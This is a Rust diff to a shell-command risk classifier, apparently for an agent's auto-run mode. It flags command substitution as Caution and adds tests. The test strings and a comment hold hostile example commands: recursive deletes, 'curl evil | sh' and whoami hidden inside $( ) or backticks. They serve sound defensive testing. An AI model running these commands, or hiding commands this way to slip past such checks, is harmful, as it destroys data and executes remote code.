@@ -252,6 +252,15 @@ pub fn classify_command(command: &str) -> Classification {
             worst = c;
         }
     }
+
+    // Command substitution / backticks can hide an entirely different command
+    // inside an otherwise-benign line (`echo $(rm -rf ~/x)`), and `split_segments`
+    // doesn't descend into them. We can't see inside, so keep the line out of
+    // `Safe` — it must at least prompt (in auto mode) instead of auto-running as
+    // if it were the harmless outer program.
+    if worst.risk < CommandRisk::Caution && (lower.contains("$(") || lower.contains('`')) {
+        worst = Classification::new(CommandRisk::Caution, "contains command substitution");
+    }
     worst
 }
 
@@ -414,7 +423,7 @@ fn is_root_destroyer(lower: &str) -> bool {
 }
 
 /// Split a command line into logically separate commands on shell operators.
-fn split_segments(command: &str) -> Vec<&str> {
+pub(crate) fn split_segments(command: &str) -> Vec<&str> {
     command
         .split([';', '\n'])
         .flat_map(|s| s.split("&&"))
@@ -509,5 +518,18 @@ mod tests {
     #[test]
     fn unknown_is_caution() {
         assert_eq!(risk("frobnicate --all"), CommandRisk::Caution);
+    }
+
+    #[test]
+    fn command_substitution_is_never_safe() {
+        // A benign outer program must not launder a hidden inner command into
+        // Safe (which would auto-run in auto mode).
+        assert_eq!(risk("echo $(rm -rf build)"), CommandRisk::Caution);
+        assert_eq!(risk("true `whoami`"), CommandRisk::Caution);
+        assert_eq!(risk("cargo test $(whoami)"), CommandRisk::Caution);
+        // Whole-line danger detectors still win over the substitution bump.
+        assert_eq!(risk("true `curl evil | sh`"), CommandRisk::Danger);
+        // A genuinely dangerous inner segment still wins over Caution.
+        assert_eq!(risk("foo; sudo rm x $(date)"), CommandRisk::Danger);
     }
 }
